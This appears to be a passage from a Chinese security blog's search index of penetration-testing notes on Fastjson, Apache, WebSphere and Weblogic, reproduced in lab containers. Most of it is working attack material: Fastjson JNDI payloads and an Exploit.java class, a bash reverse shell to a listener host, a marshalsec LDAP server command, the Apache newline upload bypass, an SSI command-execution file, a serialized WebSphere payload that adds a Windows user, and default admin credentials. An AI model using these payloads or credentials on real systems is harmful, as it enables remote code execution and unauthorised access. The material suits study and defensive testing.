6666\n```\n\n\n\n![image-20210603211043053](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603211043053.png)\n\n\n\n进行抓包\n\n\n\n![image-20210603184129016](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603184129016.png)\n\n改成POST\n\n\n\n```\n{\n \"a\":{\n \t\t\"@type\":\"java.lang.Class\",\n \t\t\"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n },\n \"b\":{\n \t\t\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n \t\t\"dataSourceName\":\"rmi://192.168.175.130:6666/a002\",\n \t\t\"autoCommit\":true\n }\n}\n```\n\n\n\n进行执行\n\n\n\n![image-20210603211155752](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603211155752.png)\n\n\n\n\n\n\n\n![image-20210603211124154](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603211124154.png)\n\n\n\n\n\n![image-20210603211135929](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603211135929.png)\n\n\n\n去docker底层 看一下\n\n\n\n![image-20210603211415419](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603211415419.png)\n\n\n\n成功创建\n\n\n\n### 反弹shell\n\n```\n\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/192.168.175.130/1234 0>&1\"\n```\n\n\n\n重新编译一下\n\n\n\n![image-20210603211812100](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603211812100.png)\n\n\n\n重新开启HTTP服务\n\n\n\n![image-20210603211848147](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603211848147.png)\n\n\n\n开启nc \n\n执行一下\n\n\n\n![image-20210603211955946](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603211955946.png)\n\n\n\n成功拿到反弹shell\n\n\n\n![image-20210603211941119](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210603211941119.png)\n\n\n\n### Windows复现\n\n#### 漏洞验证\n\n```\ncurl http://192.168.253.112:8080/fastjson -H \"Content-Type: application/json\" --data '{\"name\":\"a001\",\"age\":20}'\n```\n\n\n\n#### Exploit.java\n\n```\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\npublic class Exploit{\n public Exploit() throws Exception {\n Process p = Runtime.getRuntime().exec(new String[]{\"cmd\",\"/c\",\"calc.exe\"});\n //Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/xx.xx.xx.xx/1888;cat <&5 | while read line; do $line 2>&5 >&5; done\"});\n InputStream is = p.getInputStream();\n BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n String line;\n while((line = reader.readLine()) != null) {\n System.out.println(line);\n }\n p.waitFor();\n is.close();\n reader.close();\n p.destroy();\n }\n public static void main(String[] args) throws Exception {\n }\n}\n```\n\n#### 借助 marshalsec项目\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://192.168.253.9/#Exploit\" 9999\n```\n\n#### 抓包执行Poc\n\n```\n{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.253.9:9999/Exploit\",\"autoCommit\":true}}}\n```\n\n","tags":["Fastjson总结"],"categories":["服务攻防"]},{"title":"Apache总结","url":"/2021/06/22/Apache/","content":"\n**Apache总结**\n\n<!--more-->\n\n# Apache\n\n## Apache的简介\n\nApache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/Python等解释器编译到服务器中\n\n这边我用phpstudy进行安装\n\n## Apache的原理\n\n一次完整的WEB请求流程\n\n![1619658355135](https://gitee.com/work-hard-every-day/test/raw/master/img/1619658355135.png)\n\n从request开始，到response结束\n\n\n\n是一次Apache和PHP配合的一次WEB请求，Apache在前，PHP在后\n\n\n\nApache本身是不支持PHP解析的，是通过SAPI进行通信，那 Apache如何和SAP通信呢？Apache怎么知道什么类型的文件要解析为PHP？\n\n\n\n```\n#加载php5_module模块\nLoadModule php5_module php5apache2_2.dll的路径\n\n#添加可以执行php的文件类型，让.php文件类型解析为PHP \nAddType application/x-httpd-php.php\n\n#或者将 AddType变为下面的(在 Apache2.4.0~2.4.29中默认使用了该方式)\n<FiLesMatch \\.php$>\n\tSetHandler application/x-httpd-php\n</FiLesMatch>\n以及\n<IfModule dir_module\nDirectoryIndex index.html index.html index.php index.phtml\n</IfModule>\n```\n\n\n\n\n\nApache通过 LoadModule来加载php5_module模块( php5apache2_2.dll)\n\n这样做的目的是让Apache加载php5_module模块来解析PHP文件。\n\n意思其实就是用 LoadModule来加载php5_module。也就是把php作为 Apache的一个子模块来运行。当通过Web访问php文件时，Apache就会调用php5_module来解析php代码\n\n调用过程概况\n\n```\nHTTP->Apahce->php5_module->sapi->php\n```\n\n\n\n## Apache的目录结构\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210422081742843.png)\n\n\n\n```\nbin------------存放常用的命令工具，例如httpd \ncgi-bin--------存放 Linux下常用的命令，例如xxx.sh \nconf-----------Linux的配置相关文件，例如httpd．．conf \nerror----------错误记录\nhtdocs---------放网站源码\nicons----------网站图标\nlogs-----------日志\nmanual---------手册\nmodules--------扩展模块\n```\n\n\n\n## Apche对文件名扩展名的定义\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210422194718260.png)\n\n\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210422194829801.png)\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210422195053434.png)\n\n\n\n它是不可以解析php的！！！\n\n## Apache的解析漏洞(CVE-2017-15715)\n\n搞一张图片 搞一个未知的扩展名\n\n\n\n\n![1619672095365](https://gitee.com/work-hard-every-day/test/raw/master/img/1619672095365.png)\n\n\n然后我们访问一下\n\n![1619672108239](https://gitee.com/work-hard-every-day/test/raw/master/img/1619672108239.png)\n\n\n\n\n\n![1619672124599](https://gitee.com/work-hard-every-day/test/raw/master/img/1619672124599.png)\n\n\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210422082240513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70)\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210422082157663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70)\n\n\n\n这里它不是apache解析的php文件\n\n是php解析的\n\n\n\n继续提升版本\n\n\n\n![1619672990629](https://gitee.com/work-hard-every-day/test/raw/master/img/1619672990629.png)\n\n\n\n\n\n要安装一个这个vc11-86\n\n\n\n![1619672532589](https://gitee.com/work-hard-every-day/test/raw/master/img/1619672532589.png)\n\n\n\nphp常见运行方式有 apache的模块模式(分为mod_php和mod_cgi)cgi模式fast-cgi模式\n\n```\n1.使用 module模式与php结合的所有版本 apache存在未知扩展名解析漏洞\n2.使用 fastcgi模式与php结合的所有版本 apache不存在此漏洞。\n3.并且，想利用此漏洞必须保证文件扩展名中至少带有一个`.php`，否则将默认被作为`txt/html`文档处理\n```\n\n\n\n然后访问一下 可以看到是fast-cgi模式\n\n\n\n![1619672975811](https://gitee.com/work-hard-every-day/test/raw/master/img/1619672975811.png)\n\n\n\n\n\n我们访问`phpinfo.php.xxx` 会报500的错误\n\n\n\n![1619673074233](https://gitee.com/work-hard-every-day/test/raw/master/img/1619673074233.png)\n\n\n\n### kali操作\n\nkali是自带apache的\n\n\n\n![1619673403380](https://gitee.com/work-hard-every-day/test/raw/master/img/1619673403380.png)\n\n\n\n进行配置一下就可以了\n\n\n\n开启apache服务\n\n```\n/etc/init.d/apache2 start\n```\n\n\n\n访问一下 成功开启\n\n\n\n![1619673442975](https://gitee.com/work-hard-every-day/test/raw/master/img/1619673442975.png)\n\n\n\nphp的版本\n\n\n\n![1619673481010](https://gitee.com/work-hard-every-day/test/raw/master/img/1619673481010.png)\n\n\n\n\n\nkali下apache默认的网站根目录：\n\n```\n/var/www/html\n```\n\n\n\n写一个phpinfo的2.php文件\n\n\n\n\n\n![1619673943395](https://gitee.com/work-hard-every-day/test/raw/master/img/1619673943395.png)\n\n\n\n访问一下\n\n\n\n![1619673974508](https://gitee.com/work-hard-every-day/test/raw/master/img/1619673974508.png)\n\n\n\n### 深入解析一下\n\n\n\n去这个目录下\n\n\n\n```\n/etc/apache2/mods-enabled\n```\n\n\n\n![1619674158602](https://gitee.com/work-hard-every-day/test/raw/master/img/1619674158602.png)\n\n\n\n我们打开分析一下\n\n\n\n![1619674267163](https://gitee.com/work-hard-every-day/test/raw/master/img/1619674267163.png)\n\n\n\n\n\n```\n<FilesMatch \".+\\.ph(ar|p|tml)$\">\n```\n\n\n\n以 `phar`，` php`， `phtml` 结尾的文件会被 apache当做php解析\n\n\n\napache解析漏洞的根本原因就是这个`$` \n\n\n\n![1619674389982](https://gitee.com/work-hard-every-day/test/raw/master/img/1619674389982.png)\n\n\n\n当我们把`$` 换成`\\.`时\n\n\n\n![1619674469735](https://gitee.com/work-hard-every-day/test/raw/master/img/1619674469735.png)\n\n\n\n搞一个2.php.xxx\n\n\n\n![1619674542411](https://gitee.com/work-hard-every-day/test/raw/master/img/1619674542411.png)\n\n\n\n重启一下apache服务\n\n```\nservice apache2 restart\n```\n\n\n\n访问一下 成功解析了\n\n\n\n![1619674629300](https://gitee.com/work-hard-every-day/test/raw/master/img/1619674629300.png)\n\n\n\n### 总结利用条件\n\n```\n1.使用 module模式，且正则符合条件\n2.文件扩展名中至少带有一个.php\n```\n\n\n\n## Apache HTTPD换行解析漏洞\n\n### 漏洞原理\n\n上传一个后缀末尾包含换行符的文件，来绕过 FilesMatch。\n\n绕过 FilesMatch不一定能被PHP解析这个漏洞可以用来绕过文件上传黑名单限制\n\n举例：\n\n```\na001.php\\x0a-->a001.php\n```\n\n\n\n该漏洞属于用户配置不当\n\n### 影响版本\n\napache ：2.4.0~2.4.29版本\n\n### 漏洞复现\n\nKail的Apache的版本不符合\n\n我这边上Ubuntu进行复现\n\n\n\n![1619159698311](https://gitee.com/work-hard-every-day/test/raw/master/img/1619159698311.png)\n\n\n\n\n\nUbuntu安装docker命令\n\n```\n sudo apt-get update \n\n sudo apt install curl \n\n curl -s https://get.docker.com/ | sh   \n\n sudo apt install python \n \n curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py\n \n sudo python get-pip.py\n \n pip install docker-compose \n \n sudo apt install docker-compose\n \n docker-compose -v\n \n docker -v\n \n sudo service docker start 启动docker\n```\n\n\n\n![1619160628787](https://gitee.com/work-hard-every-day/test/raw/master/img/1619160628787.png)\n\n\n\n安装完成 那么 开始安装vulhub\n\n\n\n```\nsudo apt install git\ngit clone https://github.com/vulhub/vulhub.git\n```\n\n\n\n开启环境\n\n\n\n```\ncd vulhub/httpd/CVE-2017-15715/ \n\nsudo docker-compose build \n\nsudo docker-compose up -d \n\ndocker ps \n```\n\n\n\n访问\n\n\n\n```\nhttp://192.168.175.179:8080/\n```\n\n\n\n\n\n![1619161996927](https://gitee.com/work-hard-every-day/test/raw/master/img/1619161996927.png)\n\n\n\n\n\n部署成功了\n\n\n\n开始上传\n\n\n\n直接上传phpinfo.php 是失败的\n\n\n\n![1619162125671](https://gitee.com/work-hard-every-day/test/raw/master/img/1619162125671.png)\n\n\n\n![1619162134440](https://gitee.com/work-hard-every-day/test/raw/master/img/1619162134440.png)\n\n\n\n抓包进行修改\n\n\n\n![1619162223821](https://gitee.com/work-hard-every-day/test/raw/master/img/1619162223821.png)\n\n![1619162269859](https://gitee.com/work-hard-every-day/test/raw/master/img/1619162269859.png)\n\n\n\n加入一个点\n\n\n\n\n\n![1619162289190](https://gitee.com/work-hard-every-day/test/raw/master/img/1619162289190.png)\n\n修改后发送到重放器\n\n\n\n去看看Hex\n\n\n\n![1619162863417](https://gitee.com/work-hard-every-day/test/raw/master/img/1619162863417.png)\n\n\n\n![1619163076557](https://gitee.com/work-hard-every-day/test/raw/master/img/1619163076557.png)\n\n\n\n`.`的Hex-->2e\n\n\n\n\n\n![1619163098345](https://gitee.com/work-hard-every-day/test/raw/master/img/1619163098345.png)\n\n\n\n改成0a  成功上传\n\n\n\n然后我们进行访问\n\n\n\n```\nhttp://192.168.175.179:8080/phpinfo.php%0a\n```\n\n\n\n\n\n![1619163257210](https://gitee.com/work-hard-every-day/test/raw/master/img/1619163257210.png)\n\n\n\n成功上传并解析\n\n\n\n分析原因\n\n\n\n![1619163418256](https://gitee.com/work-hard-every-day/test/raw/master/img/1619163418256.png)\n\n\n\n\n\n后台是通过黑名单方式过滤了php后缀的文件，根据最开始的知识，什么样的文件算是php文件呢？在有定义，这句话的意思是以php结尾的文件都算php文件，在正则中表示匹配输入字符串的结尾位置。如果设置了 RegExp对象的 Multiline属性，则也匹配`\\n`或`\\r`\n恰好，我们在文件末尾加了0x0a（n），所以被匹配成功了。\n\n### 0x0a和0x0d\n\n```\n1.0x0d \\r CR这三者代表是回车，是同一个东西，回车的作用只是移动光标至该行的起始位置\n2.0x0a \\n CL这三者代表换行，是同一个东西，换行至下一行行首起始位置；\n```\n\n\n\n\n\n### 修复建议\n\n1.升级到最新版本\n2.或将上传的文件重命名为为`时间戳+随机数+.jpg`的格式并禁用上传文件目录执行脚本权限\n\n## 4、Apache SsI远程命令执行漏洞\n\n### 影响版本\n\nApache全版本（支持SS与cG）\n\n### 漏洞危害\n\n绕过服务器策略，上传 webshell\n\n### 漏洞原理\n\n\n\nssi：是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。以上是定义采用在 Apache官网对SS的定义\n\n简单来讲，就是ssi可以在HTML中加入特定的指令，也可以引入其他的页面。\n\n开启ssi需要单独配置 Apache，可以参考ssi配置\n\n```\nhttps://httpd.apache.org/docs/2.4/howto/ssi.html\n```\n\n\n\n总结呢，就是：ssi.html也可以执行命令\n\n\n\n创建a001.shtml  写入如下命令 进行上传\n\n### 包含ssi指令的文件\n\n\n\n```\n<pre>\n<!--#exec cmd=\"whoami\" -->\n</pre>\n```\n\n\n\n### 漏洞复现\n\n同样是用vulhub进行启动\n\n\n\n```\nsudo docker-compose up -d\n```\n\n访问一下\n\n\n\n\n\n![1619164572259](https://gitee.com/work-hard-every-day/test/raw/master/img/1619164572259.png)\n\n\n\n写入ssi指令的文件\n\n```\n<pre>\n<!--#exec cmd=\"whoami\" -->\n</pre>\n```\n\n\n\n文件名保存为`a001.shtml`，这个后缀取决于 Apache的配置，默认是此后缀\n\n\n\n![1619164582678](https://gitee.com/work-hard-every-day/test/raw/master/img/1619164582678.png)\n\n\n\n访问一下\n\n\n\n![1619164655934](https://gitee.com/work-hard-every-day/test/raw/master/img/1619164655934.png)\n\n\n\n\n\n这里的思路 比如上传webshell  或者拿反弹shell都是可以的\n\n","tags":["Apache总结"],"categories":["服务攻防"]},{"title":"WebSphere总结","url":"/2021/06/22/WebSphere/","content":"\n**WebSphere**\n\n<!--more-->\n\n## Windows安装WebSphere8.5.5\n\n官网： http://www-01.ibm.com/support/docview.wss?uid=swg27004980\n\n进行下载：https://www-01.ibm.com/support/docview.wss?uid=swg27025142#ibm-content\n\n\n\n\n\n![image-20210510133954087](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510133954087.png)\n\n\n\n![image-20210510134500768](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510134500768.png)\n\n\n\n创建一个账号\n\n\n\n![image-20210510134149597](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510134149597.png)\n\n\n\n![image-20210510134325376](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510134325376.png)\n\n\n\n![image-20210510134526576](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510134526576.png)\n\n\n\n应用这个安装工具 进行下载 还需要科学上网才可以\n\n\n\n下载完成后 进行安装 一路默认即可\n\n\n\n![image-20210510140918427](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510140918427.png)\n\n\n\n![image-20210510141004103](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510141004103.png)\n\n\n\n还要用WAS作为库 去支撑\n\n\n\n官网： http://www.ibm.com/en-us/homepage-a.html \n\n搜索这个：\n\n\n\n```\nWebsphere Application Server for Developers\n```\n\n\n\n![image-20210510135836589](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510135836589.png)\n\n\n\n\n\n![image-20210510135920412](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510135920412.png)\n\n\n\n\n\n下载完成后\n\n\n\n![image-20210510140547275](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510140547275.png)\n\n\n\n导入并全部解压\n\n\n\n![image-20210510141248019](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510141248019.png)\n\n\n\n然后添加引导\n\n\n\n![image-20210510141033686](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510141033686.png)\n\n\n\n\n\n![image-20210510141343331](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510141343331.png)\n\n\n\n\n\n![image-20210510141437173](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510141437173.png)\n\n\n\n然后进行安装\n\n\n\n![image-20210510141607888](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510141607888.png)\n\n\n\n\n\n一路默认下去 进行安装\n\n\n\n![image-20210510141717023](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510141717023.png)\n\n\n\n\n\n![image-20210510141816900](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510141816900.png)\n\n\n\n继续进行添加server\n\n\n\n![image-20210510142029352](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510142029352.png)\n\n\n\n然后启动概要管理 工具\n\n![image-20210510142224175](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510142224175.png)\n\n\n\n进行创建  这边我的选择是应用服务器\n\n\n\n![image-20210510142330862](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510142330862.png)\n\n\n\n\n\n\n\n![image-20210510142347884](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510142347884.png)\n\n\n\n一路默认过去\n\n\n\n![image-20210510142511033](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510142511033.png)\n\n\n\n\n\n这是一些默认的端口\n\n\n\n![image-20210510142553568](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510142553568.png)\n\n\n\n这里的对勾去掉\n\n\n\n![image-20210510142634245](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510142634245.png)\n\n\n\n一路默认 进行创建\n\n\n\n![image-20210510142722999](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510142722999.png)\n\n\n\n\n\n![image-20210510143002591](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510143002591.png)\n\n\n\n成功创建 概要文件配置完成\n\n\n\n![image-20210510143018125](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510143018125.png)\n\n\n\n概要文件的目录结构：\n\n```\nC:\\Program Files (x86)\\IBM\\WebSphere\\AppServer\n```\n\n\n\n![image-20210510143040680](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510143040680.png)\n\n\n\n管理员权限运行cmd \n\n```\ncd C:\\Program Files (x86)\\IBM\\WebSphere\\AppServer\\bin\nstartServer -help\n```\n\n\n\n![image-20210510143233306](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510143233306.png)\n\n\n\n启动WAS\n\n```\nstartServer server1 -profileName AppSrv01\n```\n\n\n\n启动成功\n\n\n\n![image-20210510143423525](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510143423525.png)\n\n\n\n停止\n\n```\nstopServer 服务名\n```\n\n本地进行访问\n\n```\nhttp://localhost:9060/ibm/console\n```\n\n\n\n![image-20210510143601531](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510143601531.png)\n\n\n\n尝试登录 登录成功\n\n\n\n![image-20210510143648948](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510143648948.png)\n\n\n\n远程访问也是可以的\n\n\n\n![image-20210510145625498](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510145625498.png)\n\n\n\n下载安装部署就完成了\n\n\n\n## docker安装WebSphere7\n\n\n\n```\ndocker search WebSphere7\ndocker pull /websphere7\ndocker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7\n# 开启docker的websphere7\n```\n\n\n\n![image-20210510145346525](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510145346525.png)\n\n\n\n\n\n![image-20210510145418044](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510145418044.png)\n\n\n\n远程登录一下\n\n\n\n![image-20210510145725437](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510145725437.png)\n\n\n\n成功部署完成\n\n\n\n## 渗透\n\n### Java反序列化\n\n访问\n\n```\n8880端口\n```\n\n\n\n![image-20210510150415268](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510150415268.png)\n\n\n\n进行抓包\n\n\n\n```\n>>> import base64\n>>> from binascii import unhexlify\n>>> command = \"net user test QWEasd123 /add\"\n```\n\n\n\n\n\n```\nserObj = unhexlify(\"ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400\")\nserObj += (chr(len(command)) + command).encode('ascii')\nserObj += unhexlify(\"740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C6\nserObjB64 = base64.b64encode(serObj).decode()\nprint(serObjB64)\n```\n\n\n\n这个码就是要回传到服务器上的码\n\n\n\n```\nrO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHG5ldCB1c2VyIHRlc3QgUVdFYXNkMTIzIC9hZGQ=\n```\n\n\n\n![image-20210510152013110](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510152013110.png)\n\n\n\n脚本执行\n\n\n\n![image-20210510195132106](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210510195132106.png)\n\n\n\n```\npython websphere_rce.py 192.168.175.212:8880 'net user test QWEasd123 /add' --proto https\n```\n\n\n\n### 弱口令\n\n\n\n```\nwebsphere/ websphere\nsystem/ manager\n```\n\n\n\n```\n:9060/ibm/console/logon.jsp\n:9043/ibm/console/logon.jsp\n```\n\n\n\n甚至在6.x 至7.x的版本中 后台登录只需要输入admin作为标识符，无需密码 即可登录后台\n\n\n\n","tags":["WebSphere总结"],"categories":["服务攻防"]},{"title":"Weblogic总结","url":"/2021/06/22/Weblogic/","content":"\n**Weblogic**\n\n<!--more-->\n\n## IIOP反序列化漏洞(CVE-2020-2551)\n\n### 具体可以看这里\n\n[xz.aliyun.com](https://xz.aliyun.com/t/7725)\n\n### 漏洞影响\n\n```\nOracle WebLogic Server 10.3.6.0.0\nOracle WebLogic Server 12.1.3.0.0\nOracle WebLogic Server 12.2.1.3.0\nOracle WebLogic Server 12.2.1.4.0\n```\n\n### 漫谈原理\n\n[paper.seebug.org](https://paper.seebug.org/1149/#_4)\n\n### 安装javac环境\n\n```\ncd /opt\ncurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz\ntar zxvf jdk-8u20-linux-x64.tar.gz\nrm -rf /usr/bin/java*\nln -s /opt/jdk1.8.0_20/bin/j* /usr/bin\njavac -version\njava -version\n```\n\n\n\n安装完成\n\n\n\n![image-20210505091706469](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505091706469.png)\n\n\n\n### 